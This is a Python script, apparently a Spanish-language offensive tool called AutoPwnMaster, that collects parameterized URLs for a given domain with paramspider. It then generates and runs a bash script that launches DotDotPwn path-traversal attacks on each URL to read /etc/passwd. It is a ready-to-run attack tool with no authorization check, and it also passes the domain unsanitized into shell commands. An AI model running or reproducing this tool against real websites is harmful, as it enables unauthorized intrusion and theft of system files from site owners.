import os
import subprocess
import sys

# Colores para la salida
CYAN = '\033[96m'
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

def run_command(command):
    """Ejecuta un comando en la línea de comandos y retorna el código de salida."""
    print(f"{CYAN}Ejecutando comando: {command}{RESET}")
    result = subprocess.run(command, shell=True)
    return result.returncode

def print_help():
    """Muestra el menú de ayuda con el ASCII art y colores."""
    ascii_art = f"""
{GREEN}_____________________________
    ____   _      _   _     _
    /    ) |  |  /    /|   / 
---/____/--|-/|-/----/-| -/-- 
  /        |/ |/    /  | /   
_/_________/__|____/___|/____{RESET}
    """
    help_text = f"""
{CYAN}{ascii_art}{RESET}
{CYAN}Uso:{RESET} AutoPwnMaster.py {CYAN}<dominio>{RESET}
    
{CYAN}Este script realiza las siguientes acciones:{RESET}
1. Ejecuta paramspider para obtener URLs.
2. Reemplaza "FUZZ" con "TRAVERSAL" en el archivo de resultados.
3. Crea y ejecuta un script bash para realizar ataques DotDotPwn en las URLs encontradas.

{CYAN}Opciones:{RESET}
-dominio  : El dominio objetivo para ejecutar el script.

{RED}Derechos reservados a Agrawain.{RESET}
{RED}Blog: https://www.hacksyndicate.tech/{RESET}
    """
    print(help_text)

def main(domain):
    # 1. Ejecutar paramspider
    print(f"{CYAN}Ejecutando paramspider...{RESET}")
    paramspider_cmd = f"paramspider -d {domain}"
    if run_command(paramspider_cmd) != 0:
        print(f"{RED}Error al ejecutar paramspider.{RESET}")
        return

    # 2. Cambiar al directorio results
    os.chdir("results")

    # 3. Reemplazar FUZZ con TRAVERSAL en el archivo
    filename = f"{domain}.txt"
    print(f"{CYAN}Reemplazando FUZZ con TRAVERSAL en {filename}...{RESET}")
    sed_cmd = f"sed -i 's/FUZZ/TRAVERSAL/g' {filename}"
    if run_command(sed_cmd) != 0:
        print(f"{RED}Error al ejecutar sed.{RESET}")
        return

    # Verificar el contenido del archivo después del reemplazo
    print(f"{CYAN}Contenido del archivo después del reemplazo:{RESET}")
    with open(filename, 'r') as file:
        print(file.read())

    # 4. Crear y ejecutar el script bash
    print(f"{CYAN}Creando y ejecutando el script bash...{RESET}")
    bash_script = f"""#!/bin/bash

# Archivo que contiene las URLs
FILE="{filename}"

FILENAME="/etc/passwd"

PATTERN="root:"

DEPTH=10

TIME_LIMIT=240

while IFS= read -r url; do
    echo "Procesando URL: $url"  # Mensaje de depuración

    if echo "$url" | grep -q "TRAVERSAL"; then
        echo "Lanzando ataque DotDotPwn en la URL: $url"

        # Ejecutamos DotDotPwn con timeout de 4 minutos
        timeout $TIME_LIMIT dotdotpwn -m http-url -d $DEPTH -f $FILENAME -u "$url" -b -k "$PATTERN"

        if [ $? -eq 124 ]; then
            echo "El ataque en $url se canceló después de $TIME_LIMIT segundos (timeout alcanzado)"
        else
            echo "Ataque completado o vulnerabilidad encontrada en $url"
        fi
    else
        echo "No se encontró TRAVERSAL en: $url"
    fi

    sleep 2
done < "$FILE"
"""
    # Guardar el script bash en un archivo temporal y ejecutarlo
    with open("run_attack.sh", "w") as file:
        file.write(bash_script)
    os.chmod("run_attack.sh", 0o755)

    if run_command("./run_attack.sh") != 0:
        print(f"{RED}Error al ejecutar el script bash.{RESET}")
        return

    print(f"{GREEN}Proceso completado.{RESET}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print_help()
        sys.exit(1)

    domain = sys.argv[1]
    main(domain)
